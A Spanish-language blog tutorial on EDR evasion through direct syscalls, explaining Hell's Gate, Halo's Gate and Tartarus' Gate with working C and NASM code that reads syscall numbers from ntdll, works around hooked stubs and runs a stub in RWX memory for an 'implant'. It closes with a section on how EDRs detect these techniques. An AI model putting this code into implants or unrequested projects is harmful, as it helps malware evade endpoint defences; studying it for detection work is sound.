---
layout: single
title: "Direct Syscalls y Hell's Gate: resolver SSNs en tiempo de ejecución para evadir hooks de EDR"
date: 2026-06-17
categories: [tutoriales, malware]
tags: [windows-internals, syscalls, direct-syscalls, hells-gate, halos-gate, evasion, edr, ntdll, syswhispers, tartarus-gate]
excerpt: "Cómo implementar direct syscalls sin depender de ntdll, y cómo Hell's Gate y Halo's Gate resuelven SSNs dinámicamente incluso cuando los stubs están hooked por un EDR."
permalink: /tutoriales/direct-syscalls-hells-gate/
---

El [post anterior](/tutoriales/syscalls-windows-vs-win32-api/) explicó por qué los stubs de `ntdll.dll` son el punto de control favorito de los EDRs: están en user-mode, son accesibles, y todas las llamadas al kernel pasan por ellos. Este post va un paso más allá: cómo implementar syscalls directas sin tocar esos stubs, y cómo obtener el SSN correcto en tiempo de ejecución sin hardcodearlo.

## Anatomía de un stub de ntdll

Antes de saltarse `ntdll`, hay que entender qué estructura tiene un stub normal. En x64, sin hooks:

```text
4C 8B D1           mov r10, rcx      ; copia primer argumento (convención syscall)
B8 55 00 00 00     mov eax, 0x55     ; carga SSN en RAX (0x55 = NtCreateFile en Win11 22H2)
0F 05              syscall           ; transición Ring 3 → Ring 0
C3                 ret
```

Son 11 bytes. El SSN siempre está en los bytes 5-6 (offset 4), justo después de `B8`. Con un hook activo, un EDR sobreescribe los primeros bytes con un salto a su propio módulo:

```text
E9 XX XX XX XX     jmp <EDR_hook>    ; hook del EDR
...                (resto del stub)
```

Esos 5 bytes de JMP sustituyen `mov r10, rcx` + el inicio de `mov eax, SSN`. El stub original queda inaccesible salvo que el EDR lo restaure al retornar.

## El problema con los SSNs hardcodeados

Los SSNs no son constantes. Cambian entre versiones de Windows porque dependen del número de servicios en la SSDT, que Microsoft puede modificar en cualquier update. `NtCreateFile` en Windows 10 21H2 tiene un SSN distinto al de Windows 11 24H2.

Si se hardcodea el valor incorrecto, se llama a una función diferente del kernel con los argumentos de otra — comportamiento indefinido, crash, o BSOD.

**SysWhispers** (y sus variantes SysWhispers2, SysWhispers3) resuelven esto generando código que detecta la versión de Windows en tiempo de ejecución y elige el SSN correspondiente de una tabla compilada:

```c
NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    // Generado por SysWhispers: elige SSN según versión detectada
    return SW2_GetSyscallNumber("NtAllocateVirtualMemory");
}
```

El problema: esta tabla de SSNs por versión es una firma conocida. Los EDRs y herramientas de threat hunting la detectan en el binario.

## Hell's Gate: leer el SSN de memoria

La idea de Hell's Gate (publicada por am0nsec y RtlMateusz en 2021) es más elegante: en lugar de hardcodear SSNs, leerlos directamente de los bytes del stub en memoria en tiempo de ejecución.

El proceso:

1. Obtener la dirección de la función `Nt*` en `ntdll.dll` (vía `GetProcAddress` o parsing manual del PE).
2. Leer los bytes en esa dirección.
3. Si el patrón es el esperado (`4C 8B D1 B8 XX 00 00 00`), extraer el SSN del byte en offset 4.
4. Construir un stub en memoria con ese SSN y ejecutarlo.

```c
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

BOOL GetSyscallNumber(PVX_TABLE_ENTRY pVxTableEntry) {
    PBYTE pFunctionAddress = (PBYTE)pVxTableEntry->pAddress;

    // Patrón esperado: 4C 8B D1 B8 XX 00 00 00 0F 05 C3
    if (pFunctionAddress[0] == 0x4c &&
        pFunctionAddress[1] == 0x8b &&
        pFunctionAddress[2] == 0xd1 &&
        pFunctionAddress[3] == 0xb8) {
        // SSN en little-endian, offset 4
        pVxTableEntry->wSystemCall = *((WORD*)(pFunctionAddress + 4));
        return TRUE;
    }
    return FALSE; // stub hooked o estructura inesperada
}
```

Si `ntdll` no está hooked, esto funciona perfectamente en cualquier versión de Windows sin tabla de versiones. El SSN se extrae dinámicamente y siempre es correcto.

## El problema de Hell's Gate con hooks activos

Cuando un EDR ha hooked el stub, los primeros bytes ya no son `4C 8B D1 B8` — son el JMP del hook. Hell's Gate falla al verificar el patrón y no puede extraer el SSN.

Esto es el talón de Aquiles de Hell's Gate en entornos con EDR activo.

## Halo's Gate: vecinos sin hookear

Halo's Gate (extensión de Hell's Gate) resuelve el caso del stub hooked aprovechando una propiedad de los SSNs: son **secuenciales por orden de dirección**. Las funciones `Nt*` en `ntdll` están ordenadas por su dirección virtual, y sus SSNs aumentan en 1 con cada función.

Si `NtCreateFile` está hooked, sus vecinos en memoria probablemente no lo están. Buscando el stub anterior o siguiente que no esté hooked, se puede calcular el SSN de la función objetivo por diferencia:

```c
BOOL GetSyscallNumberHalo(PVX_TABLE_ENTRY pVxTableEntry) {
    PBYTE pFunctionAddress = (PBYTE)pVxTableEntry->pAddress;

    // Stub no hooked: extracción directa
    if (pFunctionAddress[0] == 0x4c &&
        pFunctionAddress[1] == 0x8b &&
        pFunctionAddress[2] == 0xd1 &&
        pFunctionAddress[3] == 0xb8) {
        pVxTableEntry->wSystemCall = *((WORD*)(pFunctionAddress + 4));
        return TRUE;
    }

    // Stub hooked: buscar vecinos
    // Stride de un stub x64: ~32 bytes (alineación en ntdll)
    for (WORD i = 1; i < 500; i++) {
        // Vecino anterior (SSN = vecino_SSN - i)
        PBYTE pPrev = pFunctionAddress - (i * 0x20);
        if (pPrev[0] == 0x4c && pPrev[1] == 0x8b &&
            pPrev[2] == 0xd1 && pPrev[3] == 0xb8) {
            pVxTableEntry->wSystemCall = *((WORD*)(pPrev + 4)) + i;
            return TRUE;
        }

        // Vecino posterior (SSN = vecino_SSN + i)
        PBYTE pNext = pFunctionAddress + (i * 0x20);
        if (pNext[0] == 0x4c && pNext[1] == 0x8b &&
            pNext[2] == 0xd1 && pNext[3] == 0xb8) {
            pVxTableEntry->wSystemCall = *((WORD*)(pNext + 4)) - i;
            return TRUE;
        }
    }
    return FALSE;
}
```

El stride de `0x20` (32 bytes) es una aproximación — los stubs reales no tienen padding fijo, y la implementación correcta recorre la tabla de exports de ntdll ordenada por dirección. La idea es la misma: localizar vecinos no hooked y derivar el SSN por su posición relativa.

## Tartarus' Gate: hooks en mitad del stub

Algunos EDRs no hookean desde el primer byte. En lugar de sobreescribir `mov r10, rcx`, parchean bytes más adelante — por ejemplo, justo antes de la instrucción `syscall`. Tartarus' Gate amplía la detección de hooks comprobando también bytes en offsets posteriores del stub y aplicando la misma lógica de vecinos:

```c
// Comprobación extendida: hook en offset 3 (sobre mov eax)
if (pFunctionAddress[3] == 0xe9) {
    // hooked en offset 3 — buscar vecinos
}

// Comprobación: stub trampolín con JMP al principio
if (pFunctionAddress[0] == 0xe9) {
    // hooked en offset 0
}
```

La lógica de resolución por vecinos es idéntica a Halo's Gate — solo varía la detección del tipo de hook.

## Implementación del stub en NASM

Una vez obtenido el SSN, el implant necesita ejecutar la syscall sin pasar por ntdll. El stub se escribe en ASM o se genera en memoria:

```nasm
; stub genérico para direct syscall (x64)
; llamar con los mismos argumentos que la función Nt* correspondiente
NtAllocateVirtualMemory_stub:
    mov r10, rcx           ; primer argumento → r10 (convención syscall)
    mov eax, <SSN>         ; SSN resuelto en tiempo de ejecución
    syscall                ; Ring 3 → Ring 0
    ret
```

En C, usando una sección de código ejecutable o shellcode en memoria:

```c
// Stub como shellcode: 4C 8B D1 B8 [SSN 2 bytes] 00 00 0F 05 C3
BYTE stub[] = { 0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc3 };
*(WORD*)(stub + 4) = wSystemCall;  // insertar SSN resuelto

// Allocar memoria ejecutable y copiar el stub
PVOID execMemory = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(execMemory, stub, sizeof(stub));

// Llamar al stub
typedef NTSTATUS (NTAPI *NtFunc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
NtFunc pNtAlloc = (NtFunc)execMemory;
pNtAlloc(ProcessHandle, &BaseAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE);
```

## Comparativa de técnicas

| Técnica | Resolución SSN | Funciona con hooks | Detecta por call stack | Firma conocida |
|---|---|---|---|---|
| Direct syscall hardcoded | Compilación | Sí | Sí | Sí |
| SysWhispers 2/3 | Runtime (tabla versiones) | Sí | Sí | Sí |
| Hell's Gate | Runtime (lectura memoria) | No | Sí | No |
| Halo's Gate | Runtime (vecinos) | Sí | Sí | Parcial |
| Tartarus' Gate | Runtime (vecinos, multi-hook) | Sí | Sí | Parcial |
| Indirect syscall | Runtime (Jump a ntdll) | Sí | No | No |

El indirect syscall merece mención aparte: en lugar de implementar el propio stub, el implant salta directamente a la instrucción `syscall` dentro del stub legítimo de ntdll, evitando los bytes hooked al principio. La instrucción `syscall` original se ejecuta desde `ntdll`, por lo que el call stack parece legítimo — el vector de detección más efectivo para direct syscalls clásicos no aplica aquí.

## Cómo lo detectan los EDRs modernos

**Análisis del call stack.** El método más fiable. Una syscall legítima tiene un call stack que pasa por ntdll (`NtAllocateVirtualMemory` → `VirtualAlloc` → código llamante). Una direct syscall ejecutada desde un stub en heap tiene un frame de retorno que apunta fuera de ntdll. Los EDRs registran callbacks de kernel (`PsSetCreateThreadNotifyRoutine`, ETW-TI) y comprueban el stack al recibir la notificación.

**ETW Threat Intelligence.** El proveedor `Microsoft-Windows-Threat-Intelligence` emite eventos para operaciones críticas (allocación de memoria ejecutable, inyección de proceso, etc.) independientemente de si se usaron direct syscalls o la API normal. Los hooks de ntdll son irrelevantes para esta capa.

**Scanning de anomalías en memoria.** Un stub NASM de 11 bytes en una región `RWX` del heap es una señal de alerta. Herramientas de detección escanean regiones ejecutables que no pertenecen a módulos mapeados en el PEB.

**Detección de JMP stubs.** Algunos EDRs detectan cuando código no-ntdll salta a una instrucción `syscall` dentro de ntdll (indirect syscall) comprobando que `RIP` al momento de la syscall apunte a ntdll pero el stack de retorno no.

## Conclusión

Hell's Gate y sus variantes resuelven el problema de portabilidad de los SSNs con elegancia: en lugar de mantener tablas de versiones o depender de ntdll para la ejecución, leen el SSN de la memoria en tiempo de ejecución y lo usan directamente. Halo's Gate añade resiliencia frente a hooks al buscar stubs vecinos no parcheados.

El resultado es un implant capaz de ejecutar syscalls sin pasar por los stubs hooked de ntdll, sin firmas de tablas hardcodeadas, y sin depender de la versión exacta de Windows. La contrapartida es que el call stack sigue siendo anómalo, y las capas de detección en kernel (ETW-TI, callbacks) no se ven afectadas por ninguna de estas técnicas.

La carrera de armamentos entre técnicas de evasión y capas de detección ha escalado de user-mode a kernel-mode, y ahí el terreno es mucho más difícil para el ofensor.
